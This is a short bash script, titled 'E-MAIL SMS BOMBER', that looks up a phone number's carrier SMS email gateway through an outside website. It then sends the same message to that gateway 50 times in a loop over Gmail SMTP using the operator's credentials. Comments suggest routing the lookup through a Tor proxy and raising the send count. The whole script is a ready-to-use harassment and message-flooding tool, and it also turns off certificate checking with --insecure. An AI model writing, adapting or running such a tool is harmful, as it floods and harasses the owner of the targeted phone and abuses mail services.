#!/bin/bash
resize -s 20 100                        #resize terminal

clear                                   # Clear the screen.

echo -e "\E[1;33m::::: \e[97mE-MAIL SMS BOMBER \E[1;33m:::::\e[31m"

read -p 'Find provider SMS E-Mail, Enter the 10 digit number: ' uservar

curl http://www.xminder.com/number.check.php?number=$uservar                                 #Query provider sms email

#use proxy example curl --proxy socks5h://127.0.0.1:9050

echo -e "\E[1;33m::::: \e[97mLets setup email parameters \E[1;33m:::::\e[31m"

read -p 'Message To? use quotation marks ex "5555551111@vtext.com"  : ' uservar2             #Target sms email

read -p 'Enter your email and password like so USERNAME@gmail.com:PASSWORD  : ' uservar3       #email+password

read -n 1 -p "Create mail.txt in same directory and enter message to send ... Press any key to continue..."

echo -e "\E[1;33m::::: \e[97mBombs away PEW PEW PEW \E[1;33m:::::\e[31m"

for n in {1..50}; do curl --url "smtps://smtp.gmail.com:465" --ssl-reqd --mail-from $uservar3 --mail-rcpt $uservar2 --upload-file mail.txt --user $uservar3 --insecure; done

#to use other email services simply change "smtps://smtp.gmail.com:465" to match SMTP settings

#for n in {1..50}; 50 = how many times to send, value can be changed 
